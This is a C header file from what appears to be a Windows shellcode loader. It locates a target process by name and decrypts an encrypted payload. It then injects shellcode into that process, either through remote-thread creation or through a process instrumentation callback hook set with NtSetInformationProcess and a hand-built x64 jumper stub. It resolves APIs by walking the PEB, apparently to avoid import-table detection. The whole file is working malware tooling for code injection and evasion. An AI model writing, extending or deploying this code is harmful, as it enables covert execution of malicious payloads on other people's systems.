#pragma once 

#include <Windows.h>
#include <TlHelp32.h>
#include <stdio.h>
#include "config.h"
#include "peb-lookup.h"
#include "func-prototype.h"

DWORD FindPIDByName(wchar_t* processName) {
    HANDLE hProcessSnap;
    PROCESSENTRY32 pe32;
    DWORD pid = 0;

    // Take a snapshot of all processes in the system
    hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hProcessSnap == INVALID_HANDLE_VALUE) {
#ifdef DEBUG
        printf("[x] CreateToolhelp32Snapshot failed. Error: %lu\n", GetLastError());
#endif
        return 0;
    }

    // Initialize the PROCESSENTRY32 structure
    pe32.dwSize = sizeof(PROCESSENTRY32);

    // Retrieve information about the first process
    if (!Process32First(hProcessSnap, &pe32)) {
#ifdef DEBUG
        printf("[x] Process32First failed. Error: %lu\n", GetLastError());
#endif
        CloseHandle(hProcessSnap);
        return 0;
    }

    // Iterate through the processes to find the one with the specified name
    do {
        if (strcmp(pe32.szExeFile, processName) == 0) {
            pid = pe32.th32ProcessID;
            break;
        }
    } while (Process32Next(hProcessSnap, &pe32));

    // Clean up
    CloseHandle(hProcessSnap);

    return pid;
}

/**
 * This is where you define your own decryption/ encryption
 */



void PayloadDecrypt(unsigned char* buffer, int bufferlen, unsigned char* key, int keylen)
{
    if (strncmp((char*)keybuffer, (char*)"\xca\xfe\xba\xbe\xde\xad\xc0\xde", 8) != 0)
    {
        return;
    }


    for (int i = 0; i < bufferlen; ++i)
    {
        buffer[i] = ROTBYTE(buffer[i], 4);
        buffer[i] = inv_sbox[buffer[i]];
        buffer[i] ^= key[i % keylen];
    }
}

#define PAGE_SIZE 0x1000
#define PAGE_ALIGN(mem) ((mem + PAGE_SIZE - 1) & (~(PAGE_SIZE - 1)))
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#define ProcessInstrumentationCallback 40

typedef struct _PROCESS_INSTRUMENTATION_CALLBACK_INFORMATION
{
    ULONG Version;
    ULONG Reserved;
    PVOID Callback;
} PROCESS_INSTRUMENTATION_CALLBACK_INFORMATION, * PPROCESS_INSTRUMENTATION_CALLBACK_INFORMATION;

typedef NTSTATUS(NTAPI* pRtlAdjustPrivilege)(
    DWORD Privilege,
    BOOLEAN Enable,
    BOOLEAN CurrentThread,
    DWORD* OldStatus
    );

#ifdef SELFRUN 
BOOL PayloadExecute(unsigned char* buffer, int bufferlen)
{
    DWORD oldProtect = PAGE_READWRITE;
    HMODULE kernel32 = (HMODULE)getModuleByName(aKernel32dll);
    pGetProcAddress _GetProcAddress = (pGetProcAddress)getFuncByName(kernel32, aGetProcAddress);
    pVirtualAlloc _VirtualAlloc = (pVirtualAlloc)_GetProcAddress(kernel32, aVirtualAlloc);
    pVirtualProtect _VirtualProtect = (pVirtualProtect)_GetProcAddress(kernel32, aVirtualProtect);
    // pWriteProcessMemory _WriteProcessMemory = (pWriteProcessMemory) _GetProcAddress(kernel32, aWriteProcessMemory);
    pCreateThread _CreateThread = (pCreateThread)_GetProcAddress(kernel32, aCreateThread);
    LPVOID mem = _VirtualAlloc(NULL, bufferlen, MEM_COMMIT, PAGE_READWRITE);
    if (mem)
    {
#ifdef DEBUG
        printf("[+] Memory allocate successfully!\n");
#endif
    }
    else
    {
#ifdef DEBUG
        printf("[x] Failed to allocate memory!\n");
        DWORD error = GetLastError();
        PrintLastError(error);
#endif
        return FALSE;
    }
    memcpy(mem, buffer, bufferlen);
    BOOL check = _VirtualProtect(mem, bufferlen, PAGE_EXECUTE_READ, &oldProtect);
    if (check)
    {
#ifdef DEBUG
        printf("[+] Change memory protection successfully!\n");
#endif
    }
    else {
#ifdef DEBUG
        printf("[x] Failed to change memory protection!\n");
        DWORD error = GetLastError();
        PrintLastError(error);
#endif
        return FALSE;
    }

    HANDLE hThread = _CreateThread(NULL, 0, mem, NULL, 0, NULL);
    if (hThread)
    {
#ifdef DEBUG
        printf("[+] Create thread successfully!\n");
#endif 
    }
    else
    {
#ifdef DEBUG
        printf("[x] Failed to create thread!\n");
        DWORD error = GetLastError();
        PrintLastError(error);
#endif
        return FALSE;
    }
    WaitForSingleObject(hThread, INFINITE);
}
#endif

/**
 * The method use in below func is changing memory protection
 */



BOOL PayloadInject(HANDLE hProcess, unsigned char* buffer, int bufferlen)
{
    /**
     * buffer: start of shellcode, not include easter egg
     */
    HMODULE kernel32 = (HMODULE)getModuleByName(aKernel32dll);
    // pGetProcAddress _GetProcAddress = (pGetProcAddress) getFuncByName(kernel32, aGetProcAddress);
    pVirtualAllocEx _VirtualAllocEx = (pVirtualAllocEx)getFuncByName(kernel32, aVirtualAllocEx);

    LPVOID mem = _VirtualAllocEx(hProcess, NULL, PAGE_ALIGN(bufferlen), MEM_COMMIT, PAGE_READWRITE);
#ifdef DEBUG
    printf("[+] Addr: %p\n", mem);
#endif
    pWriteProcessMemory _WriteProcessMemory = (pWriteProcessMemory)getFuncByName(kernel32, aWriteProcessMemory);
    BOOL check = _WriteProcessMemory(hProcess, mem, buffer, bufferlen, NULL);

    if (check)
    {
#ifdef DEBUG
        printf("[+] Write memory to process successfully!\n");
#endif
    }
    else {
#ifdef DEBUG
        printf("[x] Failed to write memory!\n");
        DWORD error = GetLastError();
        PrintLastError(error);
#endif
        return FALSE;
    }
    // printf("Pause\n");
    int d;
    scanf("%d", &d);
    pVirtualProtectEx _VirtualProtectEx = (pVirtualProtectEx)getFuncByName(kernel32, aVirtualProtectEx);
    DWORD oldProtect = PAGE_READWRITE;
    check = _VirtualProtectEx(hProcess, mem, bufferlen, PAGE_EXECUTE_READWRITE, &oldProtect);
    if (check)
    {
#ifdef DEBUG
        printf("[+] Change memory protection successfully!\n");
#endif
    }
    else {
#ifdef DEBUG
        printf("[x] Failed to change memory protection!\n");
        DWORD error = GetLastError();
        PrintLastError(error);
#endif
        return FALSE;
    }

    // printf("Pause\n");
    scanf("%d", &d);

    pCreateRemoteThread _CreateRemoteThread = (pCreateRemoteThread)getFuncByName(kernel32, aCreateRemoteThread);
    HANDLE hThread = _CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)((char*)mem), NULL, 0, NULL);
    if (hThread)
    {
#ifdef DEBUG
        printf("[+] Create remote thread successfully!\n");
#endif 
    }
    else
    {
#ifdef DEBUG
        printf("[x] Failed to create remote thread!\n");
        DWORD error = GetLastError();
        PrintLastError(error);
#endif
        return FALSE;
    }
    pCloseHandle _CloseHandle = (pCloseHandle)getFuncByName(kernel32, aCloseHandle);
    // WaitForSingleObject(hThread, INFINITE);
    _CloseHandle(hThread);
    return TRUE;
}

/**
 * This version using the NtSetInformationProcess to add a hook after syscall
 */

BOOL InjectPayload(HANDLE hProcess, unsigned char* buffer, int bufferlen)
{
    HMODULE kernel32 = (HMODULE)getModuleByName(aKernel32dll);
    // pGetProcAddress _GetProcAddress = (pGetProcAddress) getFuncByName(kernel32, aGetProcAddress);
    pVirtualAllocEx _VirtualAllocEx = (pVirtualAllocEx)getFuncByName(kernel32, aVirtualAllocEx);

    LPVOID mem = _VirtualAllocEx(hProcess, NULL, PAGE_ALIGN(bufferlen), MEM_COMMIT, PAGE_READWRITE);
#ifdef DEBUG
    printf("[+] Sh3llc0d3 4ddr: %p\n", mem);
#endif

    BYTE shellcodeTemplate[49] = {
        0x55,
        0x48, 0x89, 0xe5,
        0x48, 0xc7, 0x05, 0xf1, 0xff, 0xff, 0xff, 0x41, 0xff, 0xe2, 0x00,
        0x50,
        0x53,
        0x51,
        0x41, 0x51,
        0x41, 0x52,
        0x41, 0x53,
        0x48, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0xff, 0xd0,
        0x41, 0x5b,
        0x41, 0x5a,
        0x41, 0x59,
        0x59,
        0x5b,
        0x58,
        0x5d,
        0x41, 0xff, 0xe2
    };

    // change address of jump to our shellcode
    *((DWORD64*)(&(shellcodeTemplate[26]))) = (DWORD64)mem;

    LPVOID jumper = _VirtualAllocEx(hProcess, NULL, 49, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
#ifdef DEBUG
    printf("[+] Jumper 4ddr: %p\n", jumper);
#endif


    pWriteProcessMemory _WriteProcessMemory = (pWriteProcessMemory)getFuncByName(kernel32, aWriteProcessMemory);
    BOOL check = _WriteProcessMemory(hProcess, mem, buffer, bufferlen, NULL);

    if (check)
    {
#ifdef DEBUG
        printf("[+] Write sh3llc0de to process successfully!\n");
#endif
    }
    else {
#ifdef DEBUG
        printf("[x] Failed to write sh3llc0de!\n");
        DWORD error = GetLastError();
        PrintLastError(error);
#endif
        return FALSE;
    }

    check = _WriteProcessMemory(hProcess, jumper, shellcodeTemplate, 49, NULL);

    if (check)
    {
#ifdef DEBUG
        printf("[+] Write jumper to process successfully!\n");
#endif
    }
    else {
#ifdef DEBUG
        printf("[x] Failed to write jumper!\n");
        DWORD error = GetLastError();
        PrintLastError(error);
#endif
        return FALSE;
    }

    pVirtualProtectEx _VirtualProtectEx = (pVirtualProtectEx)getFuncByName(kernel32, aVirtualProtectEx);
    DWORD oldProtect = PAGE_READWRITE;
    check = _VirtualProtectEx(hProcess, mem, bufferlen, PAGE_EXECUTE_READWRITE, &oldProtect);
    if (check)
    {
#ifdef DEBUG
        printf("[+] Change sh3llc0d3 protection successfully!\n");
#endif
    }
    else {
#ifdef DEBUG
        printf("[x] Failed to change sh3llc0d3 protection!\n");
        DWORD error = GetLastError();
        PrintLastError(error);
#endif
        return FALSE;
    }

    check = _VirtualProtectEx(hProcess, jumper, 49, PAGE_EXECUTE_READWRITE, &oldProtect);
    if (check)
    {
#ifdef DEBUG
        printf("[+] Change jumper protection successfully!\n");
#endif
    }
    else {
#ifdef DEBUG
        printf("[x] Failed to change jumper protection!\n");
        DWORD error = GetLastError();
        PrintLastError(error);
#endif
        return FALSE;
    }


    int d;
    scanf("%d", &d);

    PROCESS_INSTRUMENTATION_CALLBACK_INFORMATION procinfo;
    procinfo.Reserved = 0;
    procinfo.Version = 0;
    procinfo.Callback = jumper;

    pLoadLibraryA _LoadLibraryA = (pLoadLibraryA)getFuncByName(kernel32, aLoadLibraryA);
    HMODULE ntdll = _LoadLibraryA(aNtDlldll);
    pNtSetInformationProcess _NtSetInformationProcess = (pNtSetInformationProcess)getFuncByName(ntdll, aNtSetInformationProcess);

    if (_NtSetInformationProcess == NULL)
    {
#ifdef DEBUG
        printf("[x] Resolve NtSetInformationProcess failed!\n");
#endif
        return FALSE;
    }
    NTSTATUS stat = _NtSetInformationProcess(hProcess, ProcessInstrumentationCallback, &procinfo, sizeof(PROCESS_INSTRUMENTATION_CALLBACK_INFORMATION));

    if (!NT_SUCCESS(stat))
    {
#ifdef DEBUG
        printf("[x] Failed to deploy hook!\n");
        DWORD error = GetLastError();
        PrintLastError(error);
#endif
        return FALSE;
    }
    else
    {
#ifdef DEBUG
        printf("[+] Hook deploying successfully, waiting to be trigger...!\n");
#endif
        return TRUE;
    }
}




#undef PAGE_SIZE
#undef PAGE_ALIGN
#undef NT_SUCCESS
#undef ProcessInstrumentationCallback
